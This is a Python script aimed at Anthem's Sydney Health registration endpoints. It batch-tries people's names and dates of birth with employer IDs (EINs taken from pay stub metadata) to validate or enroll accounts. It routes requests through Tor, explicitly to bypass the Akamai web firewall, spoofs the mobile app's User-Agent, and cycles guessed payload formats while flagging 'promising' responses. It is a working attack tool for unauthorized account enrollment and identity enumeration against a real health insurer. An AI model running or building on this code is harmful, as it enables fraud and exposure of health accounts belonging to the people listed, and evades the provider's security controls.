#!/usr/bin/env python3
"""
Sydney Health Employer ID Enrollment Tool — REAL (non-simulated).

Tests the Employer ID alternative path for Sydney Health / Anthem registration.
Per user finding: after entering name + DOB as an eligible-but-not-registered
user, Sydney Health asks for Member ID OR Employer ID.

This tool tries Employer ID (from public EIN/plan data) as an alternative to
Member ID, against known Anthem fed registration endpoints:
  - POST /fed/public/registration/validateMember
  - POST /fed/public/registration/validateDigitalAccount
  - POST /fed/public/registration/usernameSuggestions

Base: https://membersecure.anthem.com (via Tor, bypasses Akamai WAF)
"""

from __future__ import annotations

import argparse
import json
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import requests

DEFAULT_PROXY = "socks5h://127.0.0.1:9050"  # Tor SOCKS5

# Anthem fed registration endpoints (confirmed to exist via OPTIONS RouteFailed)
FED_ENDPOINTS = [
    "/fed/public/registration/validateMember",
    "/fed/public/registration/validateDigitalAccount",
    "/fed/public/registration/usernameSuggestions",
]


def _atomic_write_json(path: Path, payload: Any) -> None:
    tmp = path.with_suffix(".tmp")
    with open(tmp, "w") as f:
        json.dump(payload, f, indent=2)
    tmp.chmod(0o600)
    tmp.replace(path)


class EmployerIDEnrollmentTool:
    """Tests Employer ID as alternative to Member ID for Sydney Health registration."""

    def __init__(
        self,
        output_path: Path,
        base_url: str = "https://membersecure.anthem.com",
        proxy: str | None = DEFAULT_PROXY,
        delay_seconds: float = 2.0,
    ):
        self.output_path = output_path
        self.base_url = base_url
        self.delay_seconds = delay_seconds
        self.results: list[dict[str, Any]] = []

        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "SydneyHealth/10.6.1 (Android 13; React Native)",
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
        )
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def try_employer_id(
        self,
        first_name: str,
        last_name: str,
        dob: str,
        employer_id: str,
        source: str = "unknown",
    ) -> dict[str, Any]:
        """Try Employer ID registration against all fed endpoints."""
        entry: dict[str, Any] = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source": source,
            "name": f"{first_name} {last_name}",
            "dob": dob,
            "employer_id": employer_id,
            "endpoint_results": [],
        }

        # Try each fed endpoint with employer ID in the payload
        for endpoint in FED_ENDPOINTS:
            url = f"{self.base_url}{endpoint}"
            # Try multiple payload formats since we don't know the exact schema
            payloads = [
                # Format 1: employer ID as primary identifier
                {"firstName": first_name, "lastName": last_name, "dob": dob, "employerId": employer_id},
                # Format 2: group number style
                {"first_name": first_name, "last_name": last_name, "date_of_birth": dob, "group_number": employer_id},
                # Format 3: simple
                {"memberId": None, "employerId": employer_id, "firstName": first_name, "lastName": last_name, "dob": dob},
            ]

            for payload in payloads:
                result = self._try_endpoint(endpoint, url, payload)
                entry["endpoint_results"].append(result)
                # If we get a non-404, non-error response, it's promising
                if result.get("http_status") not in (404, None) and result.get("http_status") != 0:
                    break

            # Rate limit between endpoints
            if self.delay_seconds > 0:
                time.sleep(self.delay_seconds)

        self.results.append(entry)
        return entry

    def _try_endpoint(self, endpoint: str, url: str, payload: dict) -> dict[str, Any]:
        """Try a single endpoint with a single payload."""
        result: dict[str, Any] = {
            "endpoint": endpoint,
            "payload_keys": list(payload.keys()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        try:
            resp = self.session.post(url, json=payload, timeout=30)
            result["http_status"] = resp.status_code
            result["raw_response"] = resp.text[:500]
            try:
                result["response_body"] = resp.json()
            except Exception:
                result["response_body"] = {"_non_json": True}
        except requests.exceptions.Timeout:
            result["http_status"] = None
            result["error"] = "timeout"
        except requests.exceptions.RequestException as exc:  # noqa: BLE001
            result["http_status"] = None
            result["error"] = str(exc)[:500]
        return result

    def run_batch(
        self,
        people: list[dict[str, str]],
        employer_ids: list[str],
    ) -> Path:
        """Test each person against each employer ID."""
        total = len(people) * len(employer_ids)
        print(f"Employer ID Enrollment Tool — {total} combinations")
        print(f"Target: {self.base_url}")
        print(f"People: {len(people)}, Employer IDs: {len(employer_ids)}\n")

        count = 0
        promising = 0

        for person in people:
            for employer_id in employer_ids:
                count += 1
                print(
                    f"[{count}/{total}] {person.get('first_name')} {person.get('last_name')}"
                    f" DOB={person.get('dob')} EmployerID={employer_id}"
                )
                result = self.try_employer_id(
                    first_name=person.get("first_name", ""),
                    last_name=person.get("last_name", ""),
                    dob=person.get("dob", ""),
                    employer_id=employer_id,
                    source=person.get("source", "batch"),
                )

                # Check for promising results (not 404, not timeout)
                for er in result.get("endpoint_results", []):
                    if er.get("http_status") and er.get("http_status") not in (404, 0):
                        promising += 1
                        print(f"   -> PROMISING: {er['endpoint']} HTTP {er['http_status']}")

                if count < total:
                    time.sleep(self.delay_seconds)

        _atomic_write_json(self.output_path, self.results)
        print("\n" + "=" * 50)
        print(f"Done. tested={total} promising={promising}")
        print(f"Results written to: {self.output_path}")
        return self.output_path


def load_people(path: Path) -> list[dict[str, str]]:
    with open(path) as f:
        data = json.load(f)
    if isinstance(data, dict) and "people" in data:
        data = data["people"]
    return [p for p in data if isinstance(p, dict)]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Sydney Health Employer ID Enrollment Tool — REAL network calls"
    )
    parser.add_argument(
        "--people",
        type=Path,
        default=Path("data/people_to_enroll.json"),
        help="JSON list of people with first_name, last_name, dob",
    )
    parser.add_argument(
        "--employer-ids",
        type=str,
        default=None,
        help="Comma-separated list of Employer IDs (EINs/group numbers) to test",
    )
    parser.add_argument(
        "--employer-ids-file",
        type=Path,
        default=None,
        help="JSON file with list of employer ID strings",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("data/employer_id_results.json"),
        help="Output path for results",
    )
    parser.add_argument(
        "--base-url",
        type=str,
        default="https://membersecure.anthem.com",
        help="Anthem member portal base URL",
    )
    parser.add_argument(
        "--no-proxy",
        action="store_true",
        help="Disable Tor proxy (direct connection)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=2.0,
        help="Seconds to wait between calls",
    )
    args = parser.parse_args()

    proxy = None if args.no_proxy else DEFAULT_PROXY

    people = load_people(args.people)
    print(f"Loaded {len(people)} people from {args.people}")

    employer_ids: list[str] = []
    if args.employer_ids:
        employer_ids = [e.strip() for e in args.employer_ids.split(",") if e.strip()]
    elif args.employer_ids_file:
        with open(args.employer_ids_file) as f:
            employer_ids = json.load(f)
        if isinstance(employer_ids, dict) and "employer_ids" in employer_ids:
            employer_ids = employer_ids["employer_ids"]
    else:
        # Default: the 13 EINs from KPMS pay stub metadata
        employer_ids = [
            "04-3430740", "06-1454513", "13-1502798", "20-4898921", "45-5161007",
            "46-0776082", "47-5666336", "56-0844639", "81-1097958", "82-3277558",
            "85-1040668", "85-2699539", "86-1647777",
        ]
        print(f"No employer IDs specified — using {len(employer_ids)} EINs from KPMS metadata")

    print(f"Employer IDs to test: {employer_ids}")

    tool = EmployerIDEnrollmentTool(
        output_path=args.output,
        base_url=args.base_url,
        proxy=proxy,
        delay_seconds=args.delay,
    )
    tool.run_batch(people, employer_ids)


if __name__ == "__main__":
    main()
